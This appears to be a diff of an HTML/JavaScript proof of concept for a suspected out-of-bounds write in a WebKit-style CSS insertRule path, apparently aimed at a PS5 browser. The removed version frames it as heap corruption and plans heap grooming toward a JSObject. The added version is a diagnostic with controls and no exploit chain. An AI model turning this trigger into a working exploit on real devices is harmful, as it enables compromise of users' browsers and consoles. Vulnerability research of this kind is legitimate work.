@@ -1,86 +1,188 @@
-<!DOCTYPE html>
-<html>
-<head>
+<!doctype html>
 <meta charset="utf-8">
-<title>PS5 Bug 1 - wrapperInsertRule OOB Write</title>
-<style id="sheet">
-@import url("data:text/css,body{}");
+<title>CSSStyleSheet @namespace insertRule diagnostic</title>
+<style>
+body {
+    background: #111;
+    color: #0f0;
+    font-family: monospace;
+    white-space: pre-wrap;
+}
 </style>
-</head>
-<body>
-<pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
+<pre id="log"></pre>
+
 <script>
-const L = s => { document.getElementById('log').textContent += s + '\n'; };
+/*
+  Diagnostic-only PoC:
+  Tests suspected CSSStyleSheet / StyleSheetContents wrapperInsertRule index handling
+  when inserting @namespace after existing @import rules.
 
-L('[*] Starting wrapperInsertRule OOB Write test...');
+  No heap grooming.
+  No spray.
+  No reclaim.
+  No primitives.
+  No exploit chain.
+*/
 
-// Bug: StyleSheetContents::wrapperInsertRule uses global `index` instead of
-// adjusted `childVectorIndex` when inserting @namespace rules.
-//
-// If we have @import rules, the global index is offset by the import count.
-// Inserting @namespace at index 1 (after one @import) means:
-//   childVectorIndex = 1 - 1 = 0  (correct local index)
-//   but the code inserts at index 1 (global) into an empty m_namespaceRules vector
-//   => OOB write at position 1 in a size-0 vector
+const KEY = "namespace_insert_diagnostic_last_checkpoint";
+const logEl = document.getElementById("log");
 
-const sheet = document.getElementById('sheet').sheet;
-L('[*] Initial cssRules: ' + sheet.cssRules.length);
-
-// Insert @namespace at index 1 (after the @import at index 0)
-// This triggers the OOB write
-try {
-    sheet.insertRule('@namespace foo url(http://example.com);', 1);
-    L('[+] insertRule succeeded! cssRules: ' + sheet.cssRules.length);
-    L('[+] If we reached here without crash, the OOB write happened silently.');
-    L('[+] Adjacent heap memory may be corrupted.');
-} catch (e) {
-    L('[!] insertRule threw: ' + e.message);
-}
-
-// Try with more @import rules to increase the OOB offset
-L('\n--- Test 2: Multiple @import rules ---');
-const sheet2 = document.createElement('style');
-document.head.appendChild(sheet2);
-sheet2.textContent = '';
-// Add 5 @import rules
-for (let i = 0; i < 5; i++) {
+function L(s) {
+    logEl.textContent += s + "\n";
     try {
-        sheet2.insertRule('@import url("data:text/css,body{}");', i);
-    } catch(e) {}
-}
-L('[*] Sheet2 cssRules: ' + sheet2.cssRules.length);
-
-// Now insert @namespace at index 5 (after all @imports)
-// childVectorIndex = 5 - 5 = 0, but code inserts at index 5
-// OOB write at position 5 in empty m_namespaceRules
-try {
-    sheet2.insertRule('@namespace bar url(http://example.com);', 5);
-    L('[+] Test 2 succeeded! OOB write with offset 5.');
-} catch (e) {
-    L('[!] Test 2 threw: ' + e.message);
+        localStorage.setItem(KEY, s);
+    } catch (_) {}
 }
 
-// Test 3: Large offset to corrupt more memory
-L('\n--- Test 3: Large offset ---');
-const sheet3 = document.createElement('style');
-document.head.appendChild(sheet3);
-for (let i = 0; i < 100; i++) {
+function section(name) {
+    L("\n=== " + name + " ===");
+}
+
+function safeRemove(node) {
     try {
-        sheet3.insertRule('@import url("data:text/css,body{}");', i);
-    } catch(e) { break; }
-}
-L('[*] Sheet3 cssRules: ' + sheet3.cssRules.length);
-
-try {
-    sheet3.insertRule('@namespace baz url(http://example.com);', sheet3.cssRules.length);
-    L('[+] Test 3 succeeded! OOB write with offset ' + sheet3.cssRules.length + '.');
-} catch (e) {
-    L('[!] Test 3 threw: ' + e.message);
+        node.remove();
+    } catch (_) {}
 }
 
-L('\n[*] Test finished.');
-L('[*] If no crash, we have silent heap corruption.');
-L('[*] Next step: groom heap to place a JSObject butterfly after the namespace vector.');
+function makeStyleWithText(cssText) {
+    const style = document.createElement("style");
+    document.head.appendChild(style);
+    style.textContent = cssText;
+    document.body.offsetTop;
+    return style;
+}
+
+function tryInsertNamespace(sheet, index, label) {
+    L("[*] " + label + ": before insert; cssRules.length=" + sheet.cssRules.length + ", index=" + index);
+
+    try {
+        sheet.insertRule('@namespace diag "http://example.com/ns";', index);
+        L("[+] " + label + ": insertRule returned normally");
+        L("[+] " + label + ": after insert; cssRules.length=" + sheet.cssRules.length);
+        return "returned";
+    } catch (e) {
+        L("[!] " + label + ": exception: " + e.name + ": " + e.message);
+        L("[!] " + label + ": after exception; cssRules.length=" + sheet.cssRules.length);
+        return "exception:" + e.name;
+    }
+}
+
+function testControlEmptySheet() {
+    section("CONTROL 1: empty stylesheet, insert @namespace at 0");
+
+    const style = makeStyleWithText("");
+    const result = tryInsertNamespace(style.sheet, 0, "control-empty");
+    safeRemove(style);
+
+    return result;
+}
+
+function testControlNamespaceBeforeStyleRule() {
+    section("CONTROL 2: @namespace before style rule");
+
+    const style = makeStyleWithText("");
+    let result = "not-run";
+
+    try {
+        style.sheet.insertRule('@namespace diag "http://example.com/ns";', 0);
+        style.sheet.insertRule('body { color: rgb(0, 255, 0); }', 1);
+        L("[+] control-namespace-before-style: returned normally; cssRules.length=" + style.sheet.cssRules.length);
+        result = "returned";
+    } catch (e) {
+        L("[!] control-namespace-before-style: exception: " + e.name + ": " + e.message);
+        result = "exception:" + e.name;
+    }
+
+    safeRemove(style);
+    return result;
+}
+
+function testOneImportThenNamespace() {
+    section("TEST 1: one @import, insert @namespace at global index 1");
+
+    const style = makeStyleWithText('@import url("data:text/css,body{}");\n');
+    document.body.offsetTop;
+
+    let len = 0;
+    try {
+        len = style.sheet.cssRules.length;
+        L("[*] test-one-import: initial cssRules.length=" + len);
+    } catch (e) {
+        L("[!] test-one-import: cannot read cssRules: " + e.name + ": " + e.message);
+    }
+
+    const result = tryInsertNamespace(style.sheet, 1, "test-one-import");
+    safeRemove(style);
+
+    return result;
+}
+
+function testSeveralImportsThenNamespace(importCount) {
+    section("TEST 2: several @import rules, insert @namespace after imports");
+
+    importCount = Math.max(1, Math.min(importCount, 8));
+    L("[*] using importCount=" + importCount);
+
+    const style = makeStyleWithText("");
+    const sheet = style.sheet;
+
+    for (let i = 0; i < importCount; i++) {
+        try {
+            sheet.insertRule('@import url("data:text/css,body{}");', i);
+            L("[+] inserted @import at index " + i);
+        } catch (e) {
+            L("[!] failed to insert @import at index " + i + ": " + e.name + ": " + e.message);
+            break;
+        }
+    }
+
+    document.body.offsetTop;
+
+    let len = 0;
+    try {
+        len = sheet.cssRules.length;
+        L("[*] test-several-imports: cssRules.length=" + len);
+    } catch (e) {
+        L("[!] test-several-imports: cannot read cssRules: " + e.name + ": " + e.message);
+    }
+
+    const result = tryInsertNamespace(sheet, len, "test-several-imports");
+    safeRemove(style);
+
+    return result;
+}
+
+async function main() {
+    L("[*] CSSStyleSheet @namespace insertRule diagnostic started");
+    L("[*] Previous checkpoint: " + (localStorage.getItem(KEY) || "(none)"));
+
+    const results = [];
+
+    results.push(["control-empty", testControlEmptySheet()]);
+    await new Promise(r => setTimeout(r, 50));
+
+    results.push(["control-namespace-before-style", testControlNamespaceBeforeStyleRule()]);
+    await new Promise(r => setTimeout(r, 50));
+
+    results.push(["one-import-then-namespace", testOneImportThenNamespace()]);
+    await new Promise(r => setTimeout(r, 50));
+
+    results.push(["several-imports-then-namespace", testSeveralImportsThenNamespace(3)]);
+
+    section("SUMMARY");
+    for (const [name, result] of results)
+        L(name + " => " + result);
+
+    L("\nInterpretation:");
+    L("- If controls pass and import+namespace crashes the browser/tab: strong bug signal.");
+    L("- If import+namespace throws a clean DOMException: likely handled safely.");
+    L("- If all tests return normally: either fixed/safe, or silent corruption not observable without ASan/debug.");
+    L("- Browser-only cannot prove OOB write. ASan/debug build is needed for final proof.");
+
+    L("\nDONE");
+}
+
+main().catch(e => {
+    L("[FATAL] " + (e && e.stack || e));
+});
 </script>
-</body>
-</html>
